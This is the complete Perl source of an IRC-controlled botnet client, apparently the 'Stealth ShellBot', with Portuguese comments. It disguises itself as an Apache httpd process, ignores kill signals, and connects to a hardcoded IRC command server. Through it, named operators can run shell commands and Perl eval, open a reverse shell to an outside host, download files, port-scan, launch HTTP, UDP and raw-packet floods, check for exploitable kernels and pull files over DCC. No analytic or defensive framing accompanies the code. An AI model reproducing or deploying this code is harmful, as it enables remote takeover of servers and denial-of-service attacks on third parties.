my $processo = "/usr/local/apache/bin/httpd -UdghdfRL"; 
if (`ps aux` =~ /httpd -UdghdfRL/){exit;} 
$servidor='speed.sin-ip.es' unless $servidor;
my $porta='6667';
my @canais=("#sni-labs");
my @adms=("SPEED", "C4Sh", "ODLTEAM");

my $linas_max=10;
my $sleep=3;

my $nick = getnick();
my $ircname = getnick();
my $realname = getnick();

my $acessoshell = 1;
######## Stealth ShellBot ##########
my $estatisticas = 0;
my $pacotes = 1;
####################################

my $VERSAO = '0.2a';
my $version = "!sni";

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0";
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

#####################
# Stealth Shellbot  #
#####################



sub getnick {
return "Rx".int(rand(100000));
}


sub getident {
  my $retornoident = &_get("http://www.minpop.com/sk12pack/idents.php");
  my $identchance = int(rand(100));
  if ($identchance > 30) {
     return $nick;
  } else {
     return $retornoident;
  }
  return $retornoident;
}

sub getname {
  my $retornoname = &_get("http://www.minpop.com/sk12pack/names.php");
  return $retornoname;
}

# IDENT TEMPORARIA - Pegar ident da url ta bugando o_o
sub getident2 {
        my $length=shift;
        $length = 3 if ($length < 3);

        my @chars=('a'..'z','A'..'Z','1'..'9');
        foreach (1..$length)
        {
                $randomstring.=$chars[rand @chars];
        }
        return $randomstring;
}

sub getstore ($$)
{
  my $url = shift;
  my $file = shift;

  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  #print "HOST=$host, PORT=$port, PATH=$path\n";

  $AGENT = "get-minimal";
  $VERSION = "20000118";

  $path =~ s/ /%20/g;

  require IO::Socket;
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") { # first block?
      $b1 = $buf;         # Save this for errorcode parsing
      $buf =~ s/.+?\015?\012\015?\012//s;      # zap header
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);

  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    # print "CODE=$main::http_get_result\n$b1\n";
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/
) {
      # redirect
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}

#############################
#  B0tchZ na veia ehehe :P  #
#############################

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 2;
   }

}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   &DCC::connections;
   my @ready = $sel_cliente->can_read(0.6);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       elsif ($args =~ /^\001PING\s+(\d+)\001$/) {
         notice("$pn", "\001PONG\001");
       }
       elsif (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         elsif ($args =~ /^(\Q$meunick\E|\Q$version\E)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "$version" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       $meunick = getnick();
       nick("$meunick");
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal");
       }
   }
}

sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","22","23","25","53","80","110","143");
             my (@aberta, %porta_banner);
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }
             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Portas abertas: @aberta");
             } else {
                 sendraw($IRC_cur_socket,"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.");
             }
           }
           
           elsif ($funcarg =~ /^download\s+(.*)\s+(.*)/) {
            getstore("$1", "$2");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :Download de $2 ($1) Concluído!") if ($estatisticas);
            }
             
           elsif ($funcarg =~ /^fullportscan\s+(.*)\s+(\d+)\s+(\d+)/) {
             my $hostname="$1";
             my $portainicial = "$2";
             my $portafinal = "$3";
             my (@abertas, %porta_banner);
             foreach my $porta ($portainicial..$portafinal) 
             {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
               if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($estatisticas) {
                   sendraw($IRC_cur_socket, "PRIVMSG $printl :Porta $porta aberta em $hostname");
                 }
               }
             }
             if (@abertas) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Portas abertas: @abertas");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.");
             }
            }

 elsif ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Attacking ".$1.":80 for ".$2." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($2>$cur_time){
             $cur_time = time - $itime;
	     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
	     close($socket);
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP-DDOS]\002 Finished with attacking ".$1.".");
           }

            # Duas Versões simplificada do meu Tr0x ;D
            elsif ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
              while (($pacota == "1") && ($pacotes == "1")) {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                $pacote=$rand x $rand x $rand;
                $porta = int(rand 65000) +1 if ($porta == "0");
                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
              }
              if ($estatisticas)
              {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Tempo de Pacotes\002: $tempo"."s");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total de Pacotes\002: $pacotese");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Alvo dos Pacotes\002: $1");
              }
            }
            
            elsif ($funcarg =~ /^udpfaixa\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $faixaip="$1";
              my $porta = "$2";
              my $tempo = "$3";
              my $pacote;
              my $pacotes;
              my $fim = time + $tempo;
              my $pacota = 1;
              my $alvo;
              while ($pacota == "1") {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                for (my $faixa = 1; $faixa <= 255; $faixa++) {
                  $alvo = inet_aton("$faixaip.$faixa");
                  $pacote=$rand x $rand x $rand;
                  $porta = int(rand 65000) +1 if ($porta == "0");
                  send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
                  if ($faixa >= 255) {
                    $faixa = 1;
                  }
                }
              }
              if ($estatisticas)
              {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Tempo de Pacotes\002: $tempo"."s");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total de Pacotes\002: $pacotese");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Alvo dos Pacotes\002: $alvo");
              }
            }
            
            # Conback.pl by Dominus Vis adaptada e adicionado suporte pra windows ;p
            elsif ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
              my $host = "$1";
              my $porta = "$2";
              my $proto = getprotobyname('tcp');
              my $iaddr = inet_aton($host);
              my $paddr = sockaddr_in($porta, $iaddr);
              my $shell = "/bin/sh -i";
              if ($^O eq "MSWin32") {
                $shell = "cmd.exe";
              }
              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
              connect(SOCKET, $paddr) or die "connect: $!";
              open(STDIN, ">&SOCKET");
              open(STDOUT, ">&SOCKET");
              open(STDERR, ">&SOCKET");
              system("$shell");
              close(STDIN);
              close(STDOUT);
              close(STDERR);

              if ($estatisticas)
              {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Conectando-se em\002: $host:$porta");
              }
            }

           elsif ($funcarg =~ /^oldpack\s+(.*)\s+(\d+)\s+(\d+)/) {
            return unless $pacotes;
             my ($dtime, %pacotes) = attacker("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
             unless ($estatisticas)
             {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002 - Status GERAL -\002");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Tempo\002: $dtime"."s");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total pacotes\002: ".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total bytes\002: ".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Média de envio\002: ".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime)." kbps");
             }
           }
           exit;
       }
  }
}

sub ircase {
  my ($kem, $printl, $case) = @_;

   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }

   elsif ($case =~ /^root/)
   {
	if(rooting($printl))
	{
		sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[Rooting]\002 Nothing rootable!!");
	}
    }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^conecta\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   elsif ($case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND("$1", "$2");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^entra\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^sai\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^sair/) {
     quit();
   }
   elsif ($case =~ /^novonick/) {
    my $novonick = getnick();
     nick("$novonick");
   }
   elsif ($case =~ /^estatisticas (.*)/) {
     if ($1 eq "on") {
      $estatisticas = 1;
      msg("$printl", "Estatísticas ativadas!");
     } elsif ($1 eq "off") {
      $estatisticas = 0;
      msg("$printl", "Estatísticas desativadas!");
     }
   }
   elsif ($case =~ /^pacotes (.*)/) {
     if ($1 eq "on") {
      $pacotes = 1;
      msg("$printl", "Pacotes ativados!") if ($estatisticas == "1");
     } elsif ($1 eq "off") {
      $pacotes = 0;
      msg("$printl", "Pacotes desativados!") if ($estatisticas == "1");
     }
   }
}
sub rooting {

	my $printl=$_[0];
	my $kern=`uname -a`;	
	if ($kern =~ /2.4.17\s/ || $kern =~ /2.4.18\s/ || $kern =~ /2.4.19\s/ || $kern =~ /2.4.20/ || $kern =~ /2.4.20-8/ || $kern =~ /2.4.21\s/ || $kern =~ /2.4.22\s/ || $kern =~ /2.4.22-10\s/ || $kern =~ /2.4.23\s/ || $kern =~ /2.4.24\s/ || $kern =~ /2.4.25-1\s/ || $kern =~ /2.4.26\s/ || $kern =~ /2.4.27\s/ || $kern =~ /2.6.2\s/ || $kern =~ /2.6.5\s/ || $kern =~ /2.6.6\s/ || $kern =~ /2.6.7\s/ || $kern =~ /2.6.8\s/ || $kern =~ /2.6.8-5\s/ || $kern =~ /2.6.9\s/ || $kern =~ /2.6.9-34\s/ || $kern =~ /2.6.10\s/ || $kern =~ /2.6.11/ || $kern =~ /2.6.13\s/ || $kern =~ /2.6.13-17/ || $kern =~ /2.6.14\s/ || $kern =~ /2.6.15\s/ || $kern =~ /2.6.16\s/)
	{
		sendraw($IRC_cur_socket, "PRIVMSG $printl :\002\0034[Exploitable Kernel !!]\003\002 Im exploitable Kernel: ".`uname -r`);
	}
	else
	{
		return 1;
	}
return 0;
}

sub shell {
  return unless $acessoshell;
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "Diretório inexistente!");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c >= "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'B' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65535; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);

       # DoS ?? :P
       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

#############
#  ALIASES  #
#############

sub action {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001ACTION $_[1]\001");
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub hop {
    return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub dehop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub ban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +b $_[1]");
}
sub unban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -b $_[1]");
}
sub kick {
   return unless $#_ == 1;
   sendraw("KICK $_[0] $_[1] :$_[2]");
}

sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }

sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}

sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}

sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }

sub whois {
  return unless $#_ == 0;
  sendraw("WHOIS $_[0]");
}
sub who {
  return unless $#_ == 0;
  sendraw("WHO $_[0]");
}
sub names {
  return unless $#_ == 0;
  sendraw("NAMES $_[0]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}

# DCC
package DCC;

sub connections {
   my @ready = $dcc_sel->can_read(1);
#   return unless (@ready);
   foreach my $fh (@ready) {
     my $dcctipo = $DCC{$fh}{tipo};
     my $arquivo = $DCC{$fh}{arquivo};
     my $bytes = $DCC{$fh}{bytes};
     my $cur_byte = $DCC{$fh}{curbyte};
     my $nick = $DCC{$fh}{nick};

     my $msg;
     my $nread = sysread($fh, $msg, 10240);

     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {
        $DCC{$fh}{status} = "Cancelado";
        $DCC{$fh}{ftime} = time;
        $dcc_sel->remove($fh);
        $fh->close;
        next;
     }

     if ($dcctipo eq "get") {
        $DCC{$fh}{curbyte} += length($msg);

        my $cur_byte = $DCC{$fh}{curbyte};

        open(FILE, ">> $arquivo");
        print FILE "$msg" if ($cur_byte <= $bytes);
        close(FILE);

        my $packbyte = pack("N", $cur_byte);
        print $fh "$packbyte";

        if ($bytes == $cur_byte) {
           $dcc_sel->remove($fh);
           $fh->close;
           $DCC{$fh}{status} = "Recebido";
           $DCC{$fh}{ftime} = time;
           next;
        }
     } elsif ($dcctipo eq "send") {
          my $send = $fh->accept;
          $send->autoflush(1);
          $dcc_sel->add($send);
          $dcc_sel->remove($fh);
          $DCC{$send}{tipo} = 'sendcon';
          $DCC{$send}{itime} = time;
          $DCC{$send}{nick} = $nick;
          $DCC{$send}{bytes} = $bytes;
          $DCC{$send}{curbyte} = 0;
          $DCC{$send}{arquivo} = $arquivo;
          $DCC{$send}{ip} = $send->peerhost;
          $DCC{$send}{porta} = $send->peerport;
          $DCC{$send}{status} = "Enviando";

          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, "< $arquivo");
          my $fbytes;
          read(FILE, $fbytes, 1024);
          print $send "$fbytes";
          close FILE;
#          delete($DCC{$fh});
     } elsif ($dcctipo eq 'sendcon') {
          my $bytes_sended = unpack("N", $msg);
          $DCC{$fh}{curbyte} = $bytes_sended;
          if ($bytes_sended == $bytes) {
             $fh->close;
             $dcc_sel->remove($fh);
             $DCC{$fh}{status} = "Enviado";
             $DCC{$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, "< $arquivo");
          seek(SENDFILE, $bytes_sended, 0);
          my $send_bytes;
          read(SENDFILE, $send_bytes, 1024);
          print $fh "$send_bytes";
          close(SENDFILE);
     }
   }
}


sub SEND {
  my ($nick, $arquivo) = @_;
  unless (-r "$arquivo") {
    return(0);
  }

  my $dccark = $arquivo;
  $dccark =~ s/[.*\/](\S+)/$1/;

  my $meuip = $::irc_servers{"$::IRC_cur_socket"}{'meuip'};
  my $longip = unpack("N",inet_aton($meuip));

  my @filestat = stat($arquivo);
  my $size_total=$filestat[7];
  if ($size_total == 0) {
     return(0);
  }

  my ($porta, $sendsock);
  do {
    $porta = int rand(64511);
    $porta += 1024;
    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);
  } until $sendsock;

  $DCC{$sendsock}{tipo} = 'send';
  $DCC{$sendsock}{nick} = $nick;
  $DCC{$sendsock}{bytes} = $size_total;
  $DCC{$sendsock}{arquivo} = $arquivo;


  &::ctcp("$nick", "DCC SEND $dccark $longip $porta $size_total");

}

sub GET {
  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;
  return(0) if (-e "$arquivo");
  if (open(FILE, "> $arquivo")) {
     close FILE;
  } else {
    return(0);
  }

  my $dccip=fixaddr($dcclongip);
  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);
  my $dccsock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);
  $dccsock->autoflush(1);
  $dcc_sel->add($dccsock);
  $DCC{$dccsock}{tipo} = 'get';
  $DCC{$dccsock}{itime} = time;
  $DCC{$dccsock}{nick} = $nick;
  $DCC{$dccsock}{bytes} = $bytes;
  $DCC{$dccsock}{curbyte} = 0;
  $DCC{$dccsock}{arquivo} = $arquivo;
  $DCC{$dccsock}{ip} = $dccip;
  $DCC{$dccsock}{porta} = $dccporta;
  $DCC{$dccsock}{status} = "Recebendo";
}

# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my $socket = shift;
  my $sock_tipo = $DCC{$socket}{tipo};
  unless (lc($sock_tipo) eq "chat") {
    my $nick = $DCC{$socket}{nick};
    my $arquivo = $DCC{$socket}{arquivo};
    my $itime = $DCC{$socket}{itime};
    my $ftime = time;
    my $status = $DCC{$socket}{status};
    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});

    my $d_time = $ftime-$itime;

    my $cur_byte = $DCC{$socket}{curbyte};
    my $bytes_total =  $DCC{$socket}{bytes};

    my $rate = 0;
    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;
    my $porcen = ($cur_byte*100)/$bytes_total;

    my ($r_duv, $p_duv);
    if ($rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $r_duv = $3; $r_duv++ if $4 >= 5;
       $rate = "$1\.$2"."$r_duv";
    }
    if ($porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $p_duv = $3; $p_duv++ if $4 >= 5;
       $porcen = "$1\.$2"."$p_duv";
    }
    return("$sock_tipo","$status","$nick","$arquivo","$bytes_total", "$cur_byte","$d_time", "$rate", "$porcen");
  }


  return(0);
}


# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my ($address) = @_;

    chomp $address;     # just in case, sigh.
    if ($address =~ /^\d+$/) {
        return inet_ntoa(pack "N", $address);
    } elsif ($address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return $address;
    } elsif ($address =~ tr/a-zA-Z//) {                    # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname($address))[4])[0]);
    } else {
        return;
    }
}


DDDDDDDD


